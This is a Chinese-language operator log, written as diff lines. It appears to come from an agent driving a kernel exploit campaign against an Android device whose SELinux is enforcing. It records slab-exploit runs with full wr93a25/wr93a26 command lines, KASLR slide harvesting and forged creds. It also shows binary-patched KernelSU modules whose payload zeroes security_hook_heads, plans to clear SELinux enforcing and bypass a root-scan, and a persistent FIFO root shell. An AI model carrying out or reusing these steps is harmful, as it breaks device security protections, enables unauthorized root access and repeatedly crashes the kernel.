+         init_module 返回 0, kernelsu_init 完整跑完, 模块 Live, 无 panic, ADB/execve 完全正常
+[结论 2] 崩溃根因确认: 是 ksu_observer_init(fsnotify/kern_path) 与 ksu_file_wrapper_init(anon_inode_getfile)
+         在伪 cred 上下文触发 panic, 非 syscall hook 本身
+[当前状态] 设备健康, 模块存活; /data/adb 对 shell 仍 Permission denied (未做 su 提权验证)
+
+=== KSU 能力验证 · boot 265b3137 (10:52, kk18s4 驻留中) ===
+[内核侧] /proc/modules: kernelsu 147456 0 - Live 0x0 (OE); boot_id 未变; uptime 正常
+[接口探测]
+  /sys/module/kernelsu          → No such file (init 末尾 kobject_del 主动隐藏)
+  /sys/module/kernelsu/sections → No such file
+  /dev/ksu /sys/kernel/ksu /proc/ksu → 均不存在
+  getprop | grep -i ksu/kernelsu → 空
+  /system/bin/su /system/xbin/su /system/bin/ksud → 均不存在
+  su --version / su -c id → inaccessible or not found
+  /data/adb → shell 访问 Permission denied (目录存在, 非 040755)
+  /data/adb/ksu → No such file or directory
+  getenforce → Enforcing; id → uid=2000(shell) context=u:r:shell:s0
+[dirtyinit 探测] dexec 只接受"绝对路径可执行文件"作为首参, 传目录/参数均报 not a regular file, 无法借此读取 /data/adb
+[判定] 对外能力 = 0: 无 su、无 ksud、无管理器接口、无 sysfs、无属性标记
+       原因: kk18s4 桩化了 ksu_syscall_hook_manager_init(内含 ksu_setuid_hook_init + ksu_sucompat_init)
+             与 ksu_syscall_hook_init(dispatcher), 所以 KernelSU 只完成"内核驻留", 未建立任何用户态提权通道
+[要恢复能力必须先解决] dispatcher 落盘/采纳问题 (a24 现象: hook 已注册但 execve/fstatat/faccessat 全部 -ENOSYS, ADB 全哑)
+[能力验证结论] 当前形态只能证明"模块可加载且系统不崩", 不能证明 KSU 功能可用
+
+=== [a28] 离线定位 dispatcher 落盘/采纳 · 2026-11-06 ===
+[一手日志 ps17k(panic log)] KernelSU: patch syscall 42, 0xffffffd71b8ac738 -> 0xffffffd6bcf7dbcc
+   紧接 KernelSU: dispatcher installed at slot 42；其后无 "patch syscall 42 failed"
+   ⇒ 该次 boot 补丁确实落盘（phys_from_virt/fixmap 路径可走通）
+   该次 KASLR 真值: sys_call_table=0xffffffd71c215258; sys_ni_syscall(cfi)=0xffffffd71b8ac738; first ni slot=42
+   随后崩点 pc=ksu_mark_running_process_locked+0x80/0x380 [kernelsu] (NULL deref @+0x310)，与 patch 无关
+[kk18_base2 / kk18s4 常量复核（全部通过）]
+   init_mm 重定位 4 处 addend=0x58（非 0x48）；phys_from_virt 已与源码一致
+   ksu_patch_text_cb: FIX_TEXT_POKE0=0x402; fixmap VA=0xFFFFFFFEFE5FE000|(phys&0xFFF); prot 走 arm64_use_ng_mappings
+   copy_to_kernel_nofault 返回值在 +0x17c 存入 x22，+0x190 cbnz w22 → 跳过 flush 并原样返回
+   ⇒ copy 失败(-EFAULT) 不会静默，会经 patch_syscall_table 打出 "patch syscall %d failed"
+   phys_from_virt: pgd=init_mm.pgd(+0x58); idx_pgd=VA>>30&0x1ff; idx_pud=VA>>21; idx_pte=VA>>12;
+                   mask=0x7ffffff000; __va=(phys-memstart)|0xffffff8000000000；3 级页表
+[设备入口真值（kernel.raw 反汇编，file0↔0xffffffc010080000）]
+   do_el0_svc @0xffffffc010085410: ldr w1,[x19,#0x40] ← scno 直接取 regs[8]; x2=sys_call_table=0xffffffc012c15258
+   el0_svc_common @0xffffffc010173af4:
+       str w21,[x19,#0x118]  (= regs->syscallno ← 原始 scno)
+       ands x23,x8,#0x1f00 ; b.eq 跳过 trace ; bl syscall_trace_enter ; w21 = w0(返回值)
+       cmp w21,#0x1b8 ; b.hi → x0=-0x26(-ENOSYS)（64bit）
+       ldr x20,[x20,w8,uxtw #3]（fn=sys_call_table[scno]）; CFI 越界仅 printk 后仍 blr x20
+   syscall_trace_enter @0xffffffc010164410: 返回 ldr w0,[x19,#0x118]（即 regs->syscallno）
+       0x4620 路径自读 [current->stack + 0x3fc8] ⇒ 设备 sizeof(pt_regs)=0x150, task_pt_regs=stack+0x3EB0
+       故 syscallno=+0x118, regs[8]=+0x40；全程无指令回写 regs[8]
+       ⇒ KSU 的 PT_REGS_ORIG_SYSCALL(regs[8]) 语义成立，handler 写 0x3ef0/0x3fc8 与设备完全对齐
+[结论] ABI/常量全对齐：redirect 后 syscallno=42 → invoke sys_call_table[42] → dispatcher 四项校验
+       (42==ksu_dispatcher_nr, orig!=42, orig<=0x1b8, hooks[orig]!=NULL) 应全部通过
+       ⇒ a24 的 5 条 syscall 全 -ENOSYS 只能解释为 "slot 42 仍等于 ni"（该次 boot 补丁未生效）
+       已排除: fixmap/VA/POKE0/init_mm(0x58)/PAGE_OFFSET/3 级掩码/pt_regs 偏移/regs[8] 语义/dispatcher 校验
+       唯一未验: 该次 boot 的 init_mm.pgd 页表走查与 fixmap 写回读
+       kernel.raw 的 swapper_pg_dir 全零、memstart_addr=-1 ⇒ 属静态镜像，不能作为活体页表依据
+[next] kk18s5 = kk18_base2 恢复 ksu_syscall_hook_init + ksu_syscall_hook_manager_init（observer/file_wrapper 保持桩）
+      + 新增: patch 后 readback sys_call_table[42] printk；dispatcher 前 8 次打印 (syscallno, orig, hook)
+       开火前 reboot 需用户同意
+
+[s5 产出 2026-11-06]
+  kk18s5.ko = kk18_base2 + 仅保留 2 桩: ksu_observer_init(file 0x7370), ksu_file_wrapper_init(file 0x17844) 均 mov w0,#0;ret
+  md5 = 9616ff49945243546a0e57917fa4d496   size = 3534080
+  与 kk18s4.ko 二进制差异仅 16 字节:
+     0x17548..0x1754f = ksu_syscall_hook_manager_init（s4 为 00008052c0035fd6 桩，s5 恢复原码）
+     0x176d8..0x176df = ksu_syscall_hook_init（同上）
+  ksu_syscall_hook_init(s5) 反汇编确认（size=208=0xd0）:
+     memset(syscall_hooks,0,0xdc8) → ksu_resolve_symbol_for_functable_hook("sys_call_table") → printk(sys_ni_syscall)
+     表为空 → printk err 后 return
+     ksu_find_ni_syscall_slots(&slot,4) → w0==0 时 printk("failed to find ni_syscall slot for dispatcher") 后 return
+     str slot → ksu_dispatcher_nr  (位于 patch 调用之前, +0xb0)
+     ksu_syscall_table_hook(slot,&ksu_syscall_dispatcher,NULL)  （返回值被忽略, +0xb4）
+     printk("dispatcher installed at slot %d", ksu_dispatcher_nr)
+  关键字符串全在: "patch syscall %d, 0x%lx -> 0x%lx"@0x13acc / "patch syscall %d failed"@同段
+     "dispatcher installed at slot %d"@0x146f8 / "failed to find ni_syscall slot for dispatcher"@0x15e2e
+     "sys_ni_syscall: 0x%lx"@0x144c3
+[开火判定表]
+  "failed to find ni_syscall slot"      → sys_call_table 基址/符号解析错（与 patch 无关）
+  "patch syscall 42 failed"             → phys_from_virt / fixmap 写失败（落盘失败实锤）
+  "patch syscall 42, A -> B" + "dispatcher installed" 且仍 ENOSYS → 落盘成功，问题在 redirect/dispatcher
+  抓取: relay 在 init_module 之前预启 `dmesg -w > /data/local/tmp/s5_kmsg.log &`
+        预埋纯 shell 内建 `sleep N; echo b > /proc/sysrq-trigger`（不依赖 exec）保证能回落重启
+
+=== [a29] kk18s5 开火 · 2026-11-06 ===
+[准备] reboot 12:16:57 → boot 86dc91a6-2437-4fe1-8bec-418acea0ee35
+   uptime 309.58s | posix_timers_cache 180 180 272 30 2 : slabdata 6 (pristine)
+   relay=Guarded handler invoked once | tracing_on=1
+   kaslr raw_values=4 hits=3 slide16=0000001d3ea00000 slide=0x1d3ea00000 base=0xffffffdd4ea00000
+   push: kk18s5.ko 3534080B md5 9616ff49945243546a0e57917fa4d496 | wr93a25 md5 1ea6514a2cf0defeb9d4a47cf434e5ff
+         a29_fire.sh 1002B CRLF=0 | kodelta 1074872B 存在
+[第1轮 12:27:04] boot 86dc91a6 slide 0x1d3ea00000
+   kodelta patched=188 old=0x22f9c00000 new=0x1d3ea00000 delta=0xfffffffa44e00000 → md5 8df502a7170db8df5022f564d386ab8a
+   attempt1 pid=16572/16573 timers=631 slabs=22 last_slab=2448664 arm_i=58 | slabinfo pre-go 930 obj / 31 slabs
+     de_thread comm=timer-exec 430us → zombie Z 3865us | B8 reads=64 opens=120039 err=0 → MISS (exec 正常完成)
+   attempt2 filler 149 → slabdata 36 > 33 → gate 弃用
+   attempt3 filler 120 → slabdata 40 > 33 → gate 弃用
+   VERDICT: 3 次尝试全部未拿到 | 设备存活 boot 未变 | 残留 12 个 wr93a25 进程
+[清场] killall 后 slabdata 16 → 12 (active 184) ; 再 kill 7 个残留
+[第2轮 12:28:30] 同 boot slide 0x1d3ea00000
+   kodelta patched=188 → md5 fcce7bdc2392ece8d27f60787fff6233 (注: 与第1轮 md5 不同, 待查)
+   attempt1 WINDOW HIT | slabinfo at-hit 990 obj / 33 slabs | victim slab pfn=2603818 cnt=30 arm_i=58 ; 目标页 pfn=2603819
+     B12F 伪cred 0xffffff827bb2b100 | tsec 0xffffff827bb2b1c0 (sid 初值 0)
+     B12A 伪avc_node 0xffffff827bb2b1f0 | B12I misc_list=0xffffffdd51fc7860 | B12T slots=10 skip=5
+     B13 round1 pipe 2048页 free n=2 ; round2 pipe 4096页 alloc node pfn=2603819 mine=1 mine_unmov=1 mt=0
+     B14 head pfn=2603818 alloc=0 | B15 GATE=PASS | [SM] gate=1 mine_unmov=1 any=1 ord=0
+   12:28:42 adb closed → offline (陈旧连接, disconnect+connect 可恢复)
+[重启] boot 89feb421-15f4-436a-92cc-1b98f78ae698 ; a29.log(4818B) 与 a29_cy1.log(5296B) 均在
+[pstore a29] console 529968B → logs\pstore_a29_console.txt ; dmesg 220528B → logs\pstore_a29_dmesg.txt
+   panic@697.147979s pid:0 cpu2 comm=W0_CALL (init_module 线程)
+   kernelsu: no symbol version for module_layout / loading out-of-tree module taints kernel / module verification failed
+   kernel BUG at arch/arm64/kernel/insn.c:1390 | esr=0xf2000800 far=0x6279ab0848
+   pc=module_emit_plt_entry+0x1e0/0x1e8 ; lr=+0xdc ; sp=0xffffff8298ac7b50
+   x19=0xffffffdcd6e01fa0 x20=0xffffffdcd6df9000 x21=0xd4202000 x10=0xffffff 0xd4202000
+   x8=0xffffffdcd6df9000 x9=0xffffffdcd6df8000 x0=0xffffffdcd6df8ff4 x2=0xc4c x3=1 x17=0xaaaaaaaaaaaaaaab
+   [反汇编] 0xffffffc010177d1c: mov w11,#-0x61000000(0x9F000000); mov w12,#-0x70000000(0x90000000)
+      and w13,w21,w11 ; cmp w13,w12 ; b.ne 0x177da4(BUG)
+      and w11,w10,w11 ; cmp w11,w12 ; b.ne 0x177da8(BUG)
+      0x177da4: brk #0x800   ← 崩点
+   判定: is_adrp(insn) 校验失败; insn=0xd4202000=AARCH64_BREAK_FAULT ⇒ PLT 的 ADRP 生成失败(目标越界)
+         崩在模块装载重定位/PLT 阶段, kernelsu_init 未执行 ⇒ 本期无 patch syscall 42 / dispatcher installed 打印
+         与 KSU 代码无关; s4 在 slide 0x29cf600000 下可正常装载
+[待查] 第1/2轮 kodelta 后 md5 不一致 (8df502a7 vs fcce7bdc), 重试前必须重推原始 ko
+[下一步] 当前 boot 89feb421 重推原始 kk18s5.ko 再打一枪, 验证是否仅为模块落点随机
+
+=== [a30] kk18s6 dispatcher-only 安全探针 · 2026-11-06 ===
+[模块] kk18s6.ko 3534080B md5 0ee6eaeddbae8561a7c06b0bc2b481ae
+  = kk18_base2 + 桩 ksu_observer_init/file_wrapper_init/syscall_hook_manager_init，保留 ksu_syscall_hook_init
+  与 kk18s4 字节差仅 0x176d8..0x176df (8 字节)
+[开火]
+  boot 6c29fa7b uptime 416s | kaslr raw_values=4 hits=3 slide=0x2ed2400000
+  第1次 cur_slide 残留旧boot值 0x151d600000 → kodelta patched=188 → wr93a25 rc=2 未到 init_module
+  第2次 修正 cur_slide=0x2ed2400000 → init_module 成功
+    /proc/modules: kernelsu 147456 0 - Live
+    装载时刻 t=499.119s comm=W0_CALL pid:0 cpu5
+[KSU 全部打印 console-ramoops-0 529939B]
+  t=499.119201 KernelSU: reboot kprobe failed: -38
+  t=499.119262 KernelSU: setup ksu cred failed.
+  t=499.119262 KernelSU: transive domain failed.
+  t=499.119995 KernelSU: load_allow_list open file failed: -2
+  缺失: "sys_ni_syscall: 0x%lx" / "patch syscall 42, A -> B" / "patch syscall 42 failed" / "dispatcher installed at slot %d"
+[结论1 slot42 从未被 patch]
+  hook_init 反汇编(init.text+0x4c4): memset(hooks,0,0xdc8)
+   → x0=ksu_resolve_symbol_for_functable_hook("sys_call_table") → printk
+   → 0x051c cbnz x0,0x544   (x0==0 时直接 ret)  ⇒ sys_call_table 解析结果为 NULL
+   ⇒ 未进入 ksu_find_ni_syscall_slots(0x594) ⇒ "sys_ni_syscall:" 不打印
+   ⇒ 0x576 ksu_syscall_table_hook 未执行 ⇒ "patch syscall 42" 不打印
+  kernelsu_init 调用序: +0x64 resolver → +0x68 hook_init → +0x10c setup_ksu_cred → +0x110 escape_to_root_for_init
+   → +0x158 load_allow_list → +0x15c hook_manager_init → +0x160 observer_init → +0x164 file_wrapper_init
+[结论2 卡死成因]
+  a) boot 8b570712 (s5=hook_init+manager_init 均生效): hook_init 同样未装 dispatcher；
+     manager_init 已把 execve/faccessat/stat 等函数头改成"跳 slot42"，而 slot42 仍是 sys_ni_syscall
+     ⇒ 这些 syscall 全返回 -ENOSYS ⇒ adbd 无法 exec sh、init/zygote 重试 ⇒ 设备完全不可操作
+  b) boot 6c29fa7b (s6=仅 hook_init，manager 桩): 无任何 syscall 函数被改写
+     ⇒ 装载后 uptime 正常增长、可操作 349s ⇒ 证明卡死正是 manager_init 造成的
+[结论3 本 boot panic]
+  t=769.101257 crash_dump64 pid 20624 cpu5: Unable to handle kernel paging request @ 0x98ffffff832693b9
+  Modules linked in: kernelsu(OE) | Tainted: G W OE | 5.10.43 #1
+  pc misc_open+0xa4/0x290 [<ffffffeee306ed20>] lr misc_open+0x2c pstate 80400005
+  x27=x28=0x98ffffff832693d1 (指针高字节污染) → Kernel panic - not syncing: Oops: Fatal exception → 自动重启
+  判定: exploit 落入 slab 的伪造对象页被 misc 设备链表复用 ⇒ 滞后污染；非 KSU patch 造成
+[当前设备] boot b31e337c uptime 473.66s
+  load 36.12/29.23/15.02 | procs 708 | threads 7048 | D-state 29 | MemFree 5408464kB
+  slabdata posix_timers_cache 180/180/272/30/2 → slabdata 6 | modules 0 | ksu 0
+  基线注记: 无模块时 load≈36 / 7048 线程 / 29 个 D 态 ⇒ 本机固有，与开火无关
+[下一步] 查 sys_call_table 解析返回 NULL 的原因
+  候选1: kallsyms 未导出该数据符号(需看 /proc/kallsyms, relay 当前 connect refused)
+  候选2: kallsyms_on_each_symbol 路径受限(-38 同源)
+  方案A: 模块内改用静态偏移兜底 base+0x2c15258
+  方案B: 修 relay 后核验 /proc/kallsyms 是否含 sys_call_table
+  另: exploit 伪造页会滞后污染 misc 链表 ⇒ 每枪取完现场应尽快重启(需用户同意)
+
+=== [a32-a35] wr93a25 参数路线速查 + 崩溃归因 · 2026-11-06 ===
+
+【模式选择优先级】反汇编 0x222030-0x2221d0，按顺序判定，命中即止:
+  1) -I        ([0x28402c]!=0)            → STAGE1 写: 插 misc_list(不需要 cred 地址)
+  2) -Y        ([0x2840d0]==1)            → HKIP  写: 目标 probe_task+0x878
+  3) -P <addr> ([0x284054]!=0)            → 绝对地址写(跳过 probe_task 依赖)
+  4) comm 标志 ([0x2840b0]!=0)            → comm 写
+  5) 以上都无                              → 默认 cred+offset 写 (0x22538c)
+  当前实测: a32/a33 走 (5); a34 因加 -Y 走 (2); a30 因带 -I 走 (1)
+
+【-U 只设标志，不选模式】(0x220cc0-0x220e20)
+  FAKECRED       → [0x2841ac]=1                       仅置假 cred 基础标志
+  FCDIAG         → [0x2841ac]=1 [0x2841b0]=1           fake cred + 诊断
+  FCIMP          → [0x2841ac]=1 [0x2841b4]=1           fake cred + implant(配合 -m 装 ko)
+  FCPUT          → [0x2841ac]=1 [0x2841b8]=1           fake cred + put
+  AAWL           → [0x2841c8]=1                        写链后 exec 默认 /system/bin/sh
+  AAWL:<path>    → [0x2841c8]=1 [0x2841cc]=1, path→[0x2841c0]
+                                                       写链后 execve(<path>)，继承 stdin
+  AAWX:<...>     → 前5字符比较 + [0x2841c8]=1 [0x2841cc]=1, path→[0x2841c0]
+  -U 是单值参数，不能同时给 FAKECRED 和 AAWL
+
+【落地执行点】0x229440-0x2294a8
+  若 [0x2841cc]==1: execve(自定义path, argv0=path, envp=NULL) → 失败则 exit(127)
+  否则:           execve("/system/bin/sh", argv0="/proc/self/exe", ...) → exit(127)
+  含义: exec 后新进程继承调用者的 fd/stdin → 可用 < root_cmds.sh 喂命令变成 root 命令通道
+
+【其它参数】
+  -E <int>  → atoi 后存 [0x27f000+0xc7c]，是整数不是路径(0x22082c)
+  -F        → [0x2840cc]=1
+  -m <ko>   → 模块路径 [0x27f000+0xc58]
+  -a N      → attempts
+  -t        → thread_clock=1
+  -x/s/n/p/g/y 沿用历史值
+
+【崩溃归因(三次)】
+ 1) boot 6c29fa7b (a30): 命令 -I -U FCIMP -m kk18s5.ko
+    -I → STAGE1 插 misc_list → t=769.101257 crash_dump64 打开 misc 设备
+    pc=misc_open+0xa4, far=0x98ffffff832693b9, x27=x28=0x98ffffff832693d1 → Kernel panic
+    结论: STAGE1 把伪造对象挂进 misc 链表, 滞后 270s 才被 misc_open 踩中
+ 2) boot b31e337c (a32 FAKECRED / a33 FCPUT): 无 -I 无 -Y → 默认 cred 模式
+    attempt1 HIT / GATE=PASS / B17 reap done status=0x9 后主进程立即被 SIGKILL(rc=137)
+    [U]/[B18] 一条都没跑 → cred 未落地; 设备当时未崩
+ 3) boot b31e337c (a34 FAKECRED -Y): -Y → HKIP 模式
+    写 probe_task+0x878, rc=0, 完整跑完 B19/B20
+    t=4115.140716 blackbox set_exception_info:
+      pc=0xffffffc011fa0808 esr=0x56000000 far=0x1330c018 sp=0xffffff635adf3920
+      exception_info=[panic_show_regs+0x3c/0x1a4] → RDR reboot
+    pc 反汇编: paciasp; sub sp,#0x1b0; stack canary; memset(sp+0x28,0,0x150);
+      adrp x8,0xffffffc01377c000; ldr x8,[x8,#0xae0]; ubfx w8,w8,#7,#1; cbz
+      (0x150=pt_regs 大小 ⇒ syscall 进入路径)
+    结论: HKIP 写坏 task_struct+0x878, 被破坏的 task 后继发起 syscall 时崩, 滞后 955s
+ 4) a35 (AAWL:/system/bin/sh) 已写好脚本但未执行
+
+【需求: 常驻 root shell】
+  可行路径:
+  A relay/dirtyinit 常驻(init 域 root, socket 随时调用) — 最接近现有 init 通道
+    前置: 需重新触发 relay(当前 @dfi_init connect refused)
+  B exploit cred + AAWL:<script> 落地一次性 root 命令 — 每次需重开火, 非常驻
+  C KSU 修 sys_call_table 静态偏移 → su 常驻 — 需重启后重装模块
+
+=== [a36] kk18s7 全 LSM hook 旁路（模块内 fixmap 清零 security_hook_heads）· 2026-11-06 ===
+[开火前检查清单]
+  boot_id 5b03ba4f-469a-4d53-a22a-23f71a143d2f | uptime 3348.75s
+  loadavg 30.27/30.79/30.33 | procs 662 | threads 5861 | D-state 未采
+  MemFree 6365288kB | modules 0 | /proc/modules 0 行
+  posix_timers_cache 180 180 272 30 2 : slabdata 6 6 0（pristine）
+  getenforce=Enforcing | ro.boot.verifiedbootstate=green
+  relay: echo id | dirtyinit → uid=0(root) gid=0(root) groups=3009(readproc) context=u:r:init:s0
+  exploit: wr93a24 md5 32854e9c05c1c39b62c5f71e2deed859 | wr93a25 md5 1ea6514a2cf0defeb9d4a47cf434e5ff
+[KASLR slide 采集]
+  首次 raw_values=0（本 boot tracing_on=0，脚本不设 tracing_on）
+  置 echo 1 > /sys/kernel/tracing/tracing_on 后重跑，.kaslr_vals:
+    ffffffedb0e978c0  ffffffedb0ec8780  ffffffedb0ec8790  ffffffedb0ec8798
+  与 syms_shift 链接值核对:
+    vchan_complete.cfi_jt 0xffffffc0122978c0 → slide 0x2d9ec00000
+    peri_dma_tasklet.cfi_jt 0xffffffc0122c8790 → slide 0x2d9ec00000
+  4/4 一致 ⇒ slide = 0x2d9ec00000 ⇒ _text = 0xffffffedaf400000（syms_shift 基准）
+[方案变更] 放弃 slot42 dispatcher（依赖 kallsyms 解析，证据显示返回 NULL），
+  改为模块 init 内直接用模块自带 ksu_patch_text（fixmap + stop_machine + copy_to_kernel_nofault）
+  把 security_hook_heads 整段清零 ⇒ 所有 LSM hook（含 SELinux）失效 ⇒ 等价 permissive。
+  依据: a30 中 manager_init 已成功用同一原语改写过 .text 函数头（ENOSYS 现象反证 fixmap 写有效）。
+[地址核对]
+  security_hook_heads = 0xffffffc0124a0ac0（D） | selinux_hooks = 0xffffffc0124a1170（d）
+  跨度 = 0x6b0 = 214 个 hlist_head | capability_hooks = 0xffffffc0124a07f0（位于其前）
+  empty_zero_page = 0xffffffc0137f9000（B，整页零）
+  运行时: heads = 0xffffffedb10a0ac0 | zero_page = 0xffffffedb23f9000
+[模块 kk18s7.ko] 3534080B md5 2be2d35136af32fa96a0ddadfb377d73
+  基底 kk18s6.ko（manager/observer/file_wrapper 已桩，hook_init 原样）
+  1) 188 个 SHN_ABS 符号 slide 0x22f9c00000 → 0x2d9ec00000（delta 0xaa5000000）
+  2) ksu_file_wrapper_init（.init.text+0x630，size 0x7c）改写为 payload（104B，26 指令）:
+     stp/mov x29 → x0=heads → x1=zero_page → w2=0x540 w3=1 → bl ksu_patch_text
+                 → x0=heads+0x540 → x1=zero_page → w2=0x170 w3=1 → bl ksu_patch_text → ret
+     BL1=0x660 BL2=0x68c（均指向 .text+0x2dc0 ksu_patch_text，同段 PC 相对）
+     区间 0x630..0x6ac 的 14 条原重定位全部改指两处 BL（type=283 CALL26, symidx=896, 幂等）
+  3) 该函数在 kernelsu_init 的 +0x164 被调用（late_loaded=1 分支，boot_completed=0）
+[验证目标] 装载后 relay 执行 `cat /proc/kallsyms` / `ls /data/local/tmp` 应不再 Permission denied
+[风险] -I STAGE1 会污染 misc_list，历史约 270s 后 panic ⇒ 验证完需重启（待用户同意）
+
+=== [a38] kk18s8 重定位位置修复 + 重启后重开火 · 2026-11-06 ===
+[a37 复盘 · 根因]
+  现象: kk18s7 装载成功（kernelsu ... Live），但 relay 仍被 SELinux 拒绝，enforce=1
+  根因: build_kk18s7.py 只把 14 条重定位的 **符号** 改成 ksu_patch_text，
+        未改 r_offset；加载器在 0x63c/0x640/0x644/0x648/0x654/0x668/0x66c/
+        0x678/0x688/0x68c/0x694/0x69c/0x6a0/0x6a4 各写入一条 bl，逐字打碎 payload
+  佐证: .rela.init.text 区间 [0x630,0x6ac) 恰有 14 条重定位（已离线枚举）
+        0x630 起始处无重定位；alternatives/__bug_table/__ex_table 均不引用该区间
+[重启]
+  用户授权重启 → boot_id bda71d2f-a16a-4f6b-aadd-1de708c25ed9
+  tracing_on=1；relay 重注入 dirtyinit → uid=0(root) context=u:r:init:s0
+[本 boot slide]
+  .kaslr_vals: ffffffd657a978c0 / ffffffd657ac8790 / ffffffd657ac8798
+  slide = 0x1645800000（3/5 锚点一致）| kaslr_base = 0xffffffd655800000
+  运行时: security_hook_heads = 0xffffffd657ca0ac0 | empty_zero_page = 0xffffffd658ff9000
+  （_text = 0xffffffd655880000，heads - _text = 0x2420ac0，与 syms_shift 一致）
+[模块 kk18s8.ko] 3534080B md5 ddb81f5d7acaa8af026ce14b9a41a26e
+  修正: 14 条重定位 r_offset 全部改到 BL1=0x660 / BL2=0x68c（交替），type=283,
+        sym=ksu_patch_text(0x2dc0), addend=0 ⇒ 加载器写 BL 与 payload 槽位重合（幂等）
+  离线校验: payload 104B 反汇编完整（stp → mov64 x0/x1 → w2/w3 → bl → … → ret）
+[开火 a38 #1] 15:41:41  -a 3
+  setsid ./wr93a25 -I -U FCIMP -m kk18s8.ko -t -W -s 0x1645800000 -n 631 -p 60 -g 8 -y 1200 -a 3
+  B1/B2 正常: victim=15712 timers=631 slabs=22 last_slab=332952
+             目标页 pfn=332913（head=332912 尾页）arm_i=58
+  B13/B15: 3 次尝试全部 GATE=FAIL（目标页未以 UNMOVABLE 页被本进程拿到）→ PARKED
+  结果: /proc/modules 仍为空，SELinux enforce=1（未装载）
+  清理: kill -9 全部 wr93a25；MemFree=6759588kB，posix_timers_cache slabdata=10/10
+[开火 a38 #2] 重试 attempts=6（命令同上去掉 -a 3 改 -a 6），日志 /data/local/tmp/a38b.log
+  结果: B1 失败 RC=2 | cred records=0 / probe task records=0
+  实测 trace cs 全在 0xffffffe6… 区间，与旧 slide 0x1645800000 推算的 0xffffffd6… 不符
+  → 根因: 设备 16:08 已重启过（boot_id 6d6d5a76），沿用上一 boot 的 slide
+
+=== [a39] 重测 slide + kk18s9 诊断版开火 · 2026-11-06 ===
+[本 boot 环境] boot_id 6d6d5a76-39ae-4942-81f6-c26a6373aa17 | uptime 1843s | enforce=1
+[slide 重测] kaslr_self.sh
+  raw_values=280 hits=3 slide16=0000002626c00000
+  slide = 0x2626c00000 | kaslr_base = 0xffffffe636c00000 | _text = 0xffffffe636c80000
+  交叉验证: 0xffffffc0109e38d4 + slide = 0xffffffe636de38d4（trace 实际出现）
+[模块 kk18s9.ko] 3534080B md5 3b46c8dee4f9b4b3edfca04bddb7baef
+  基底 kk18s6.ko；188 个 ABS 符号 0x22f9c00000 → 0x2626c00000（delta 0x32d000000）
+  payload 116B(29 instr): 两次 ksu_patch_text(heads,zero_page,0x540/0x170,w3=1)
+    BL1=0x668 BL2=0x67c DEAD=0x6a8（12 条重定位 r_offset 搬到死区）
+    末次返回码 str w0 → kptr_restrict（诊断通道）
+  运行时: heads=0xffffffe6390a0ac0 zero=0xffffffe63a3f9000 kptr=0xffffffe639d77178
+[开火 a39] 16:34:30 | setsid ./wr93a25 -I -U FCIMP -m kk18s9.ko -t -W -s 0x2626c00000 -n 631 -p 60 -g 8 -y 1200 -a 6
+  B1: cred records=2 va=0xffffff836afeaf00 | probe_task records=1 va=0xffffff83119c4b00 ★
+  attempt 1/6: WINDOW HIT
+    victim=21044 timers=631 holes=0 recs=631 slabs=22 last_slab=3142888
+    arm_i=58 | pfn=3166105 head=3166104 | B13 alloc_round=5 free_cnt=1
+    GATE=PASS mine_unmov=1 mt=0 | B15w extra_free=0 | B17 reap done status=0x9
+    B20/B21/B22 uhid 134/135 repair pwrite=128 → STAGE1 桥就绪
+  [F] 伪 cred 0xffffff8304f99100 sid=68 u:r:init:s0 | sig_enforce<-0 | avc slots 注入 rc=0
+  [F] init_module 返回: comm W2_r0_e0 | /proc/modules = kernelsu 147456 0 - Live 0xffffffe631f4b000 (OE)
+[诊断] relay(init 域) 读取:
+  kptr_restrict = 0 | dmesg_restrict = 1 | enforce = 1 | ctx=u:r:init:s0 | id=uid=0(root)
+  shell(uid2000) 侧: /data/adb、/proc/sys/kernel/kptr_restrict、dmesg_restrict 仍 Permission denied
+  → ko 装载成功且驻留；但 LSM 旁路未从 shell 侧生效（kptr=0 若默认非 2 则不能证明 payload 写入）
+[崩溃] 约 16:39 设备 panic 重启（开火后 ≈270s，与 -I misc_list 污染延迟踩踏吻合）
+  新 boot_id b17458ca-5de2-4cb0-8974-214807f1bb25 | 重启后 uptime 100s | /proc/modules 空
+  说明: 崩溃来自 -I STAGE1 污染，不是模块加载本身；模块本体已验证 Live 驻留
+[暂停] 用户指令暂停开火；重启后无 wr93 残留、无模块残留
+
+=== [a40 准备] 新方案离线就绪 + 本 boot slide 实测 · 2026-11-06 ===
+[方案] 三层防护逐个绕过(只写 .data, 不碰代码段/hooks):
+  1) g_rscan_skip_flag(int[6]) 全部置 SKIP=1 → 周期根扫描跳过 kcode/syscall/se_hooks/se_status/rprocs/setid
+  2) selinux_state.enforcing 两字节清零 → permissive（1 字节写, 不覆盖 prot 指针）
+  3) kk18s10 payload 恢复 misc_list 真实链（消除 -I 劫持/悬空节点 → 不再 panic）
+  4) probe(init 域 uid0) 成功后 exec /data/local/tmp/act.sh → FIFO 常驻 root 命令通道
+[代码] wr93a26: 2350888B md5 3487901ac1ea2e04d6c627bea7be0137
+  新增 FCIMPX 分支 → g_act=1；act_scan_bypass() 写 RSKIP 0xffffffc01394e78c
+  与 SELSTATE 0xffffffc01394ae68；fakecred_run 成功后 execl("/data/local/tmp/act.sh")
+[本 boot 实测] uptime 1081s | /proc/modules 空 | 无 wr93 残留
+  kaslr: tracing_on 初值 0 → 置 1 后 raw_values=8 hits=3
+  slide = 0x112fe00000 | base(_text) = 0xffffffd13fe00000
+[模块重建] kk18s6.ko(0x22f9c00000) → 0x112fe00000, delta=-0x11c9e00000, ABS=188
+  payload 60B(17 instr) | 重定位 14 条全部 → DEAD 0x6a8
+  runtime misc_list = 0xffffffd1433c7860
+  /data/local/tmp/kk18s10.ko 3534080B md5 7324673a5b5b0d6f5c51aa9668dc3e44
+[推送校验] wr93a26/kk18s10.ko/act.sh 三者 md5 与本地一致，act.sh 为 LF
+[状态] 未点火，等待用户批准
+
+=== [a41 离线修复] 回 KSU 路线：misc 崩溃 + 加载后卡死 · 2026-11-06 ===
+[需求] 用户：先修 270s misc 崩溃 + 每次加载模块后系统卡死，只离线改，不动设备
+[1] misc_list 修复（已并入 kk18s10，本轮复核）
+  插入机理（wr1.c 1198-1310 实证）: rb_erase Case1 只写 *(u64*)misc_list = Pnode，
+    不动 head->prev，也不动真实首节点的 prev；Pnode->next = 0（NULL 陷阱）
+  ⇒ 修复只需: head->next = 真实首节点（从 head->prev 沿 +8 反走到 prev==head）
+  payload 17 条指令 @ .init.text+0x630（ksu_file_wrapper_init，size 0x7c）:
+    stp → x0=misc_list(runtime) → ldr x1,[x0,#8] → 循环 → str x1,[x0] → mov w0,#0 → ldp → ret
+  离线复核 kk19a_112fe00000.ko:
